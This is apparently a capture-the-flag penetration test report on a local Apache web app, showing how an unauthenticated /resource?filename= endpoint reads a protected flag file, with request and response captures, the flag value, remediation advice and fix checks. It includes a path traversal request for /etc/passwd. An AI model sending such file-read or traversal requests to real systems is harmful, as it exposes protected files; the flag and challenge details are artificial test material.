## TL;DR
- Objective: Retrieve the static flag from target 127.0.0.1:33005
- Outcome: **ACHIEVED** - Flag successfully retrieved
- Highest-impact finding: Local File Inclusion (LFI) via `/resource?filename=` endpoint bypassing Apache access controls
- Validation status: Confirmed - Flag retrieved: `FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}`

## Target Information
- Target: 127.0.0.1:33005
- Host / base URL: `http://127.0.0.1:33005`
- Application or component: Apache/2.4.66 (Debian) web application with dynamic file serving
- Authentication context: None required for vulnerable endpoint
- Relevant technology details:
  - Apache web server with directory listing enabled on `/static/`
  - Server-side file serving via `/resource?filename=` endpoint
  - `.htaccess` or directory-level restrictions protecting `/static/flag`

## Confirmed Vulnerability

### Local File Inclusion / Information Disclosure
- Affected endpoint / component: `/resource?filename=` parameter
- Impact: Unauthorized access to protected files, bypassing Apache-level access controls. Sensitive files (including the flag) can be retrieved without authentication.
- Preconditions: None - endpoint is publicly accessible without authentication
- Exact payload or PoC:
```
GET /resource?filename=flag HTTP/1.1
Host: 127.0.0.1:33005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
```

## Steps to Reproduce

1. **Discover directory listing** - Navigate to `/static/` to enumerate available files:
   ```
   GET /static/ HTTP/1.1
   Host: 127.0.0.1:33005
   ```
   Response reveals `flag` file exists in the directory listing.

2. **Attempt direct access (blocked)** - Try accessing the flag directly:
   ```
   GET /static/flag HTTP/1.1
   Host: 127.0.0.1:33005
   ```
   Response: `HTTP/1.1 403 Forbidden` - Apache denies access.

3. **Exploit LFI via resource endpoint** - Bypass Apache restrictions using the vulnerable file serving endpoint:
   ```
   GET /resource?filename=flag HTTP/1.1
   Host: 127.0.0.1:33005
   ```
   Response: `HTTP/1.1 200 OK` with flag content.

## Validation / Evidence

- Validation token / flag: `FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}`

- Tool evidence: HTTP request/response captured during reconnaissance

- Request evidence:
```
GET /resource?filename=flag HTTP/1.1
Host: 127.0.0.1:33005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
```

- Response evidence:
```
HTTP/1.1 200 OK
date: Thu, 02 Apr 2026 08:52:46 GMT
server: Apache/2.4.66 (Debian)
content-length: 70
content-disposition: inline; filename=flag
cache-control: no-cache
content-type: application/octet-stream

FLAG{fe4218ba92808c79600e0d2a9ffd9ae324a4cda320d6a59bc59f79f817bb5f58}
```

- Directory listing evidence (revealed flag file existence):
```html
<h1>Index of /static</h1>
<ul>
<li><a href="css/"> css/</a></li>
<li><a href="flag"> flag</a></li>
<li><a href="js/"> js/</a></li>
</ul>
```

- Notes on reliability / limitations: Vulnerability is 100% reliable. No authentication or special conditions required. The resource endpoint directly reads files from the filesystem without respecting Apache's access control rules.

## Remediation

- Root cause: The `/resource?filename=` endpoint reads files from the filesystem without proper access control validation or path sanitization. It bypasses Apache-level protections (`.htaccess`, directory restrictions) because the application server reads files directly rather than serving them through Apache's request handling.

- Recommended fix:
  1. **Implement an allowlist** - Only permit access to specific, non-sensitive files through the resource endpoint
  2. **Add authentication** - Require valid authentication before serving any files via `/resource`
  3. **Path traversal protection** - Validate and sanitize the `filename` parameter to prevent directory traversal (`../`, absolute paths)
  4. **Respect web server ACLs** - Integrate with or replicate Apache's access control logic at the application layer
  5. **Disable directory listing** - Turn off `Options +Indexes` in Apache configuration for `/static/`

- Defense-in-depth:
  - Store sensitive files outside the web root
  - Use application-level permissions to control file access
  - Log all file access attempts via the resource endpoint
  - Consider using signed/signed URLs for temporary file access instead of direct file serving

## How to Verify the Fix

1. **Test access control**:
   ```
   GET /resource?filename=flag HTTP/1.1
   Host: 127.0.0.1:33005
   ```
   Expected secure result: `HTTP/1.1 403 Forbidden` or `HTTP/1.1 401 Unauthorized`

2. **Test authentication requirement**:
   - Attempt to access `/resource?filename=<any_file>` without credentials
   - Expected secure result: Authentication challenge or access denied

3. **Test path traversal** (if allowlist implemented):
   ```
   GET /resource?filename=../../../etc/passwd HTTP/1.1
   Host: 127.0.0.1:33005
   ```
   Expected secure result: `HTTP/1.1 400 Bad Request` or access denied

## Remaining Leads

- Confirmed blockers: None - exploitation successful
- Unverified leads:
  - Login form at `/login` has broken client-side JavaScript - potential for additional vulnerabilities if explored
  - Other files in `/static/` directory may contain sensitive information
  - The `filename` parameter may be vulnerable to path traversal beyond the static directory (e.g., `/etc/passwd`)
- Missing context: Application source code not analyzed to determine full scope of LFI capability
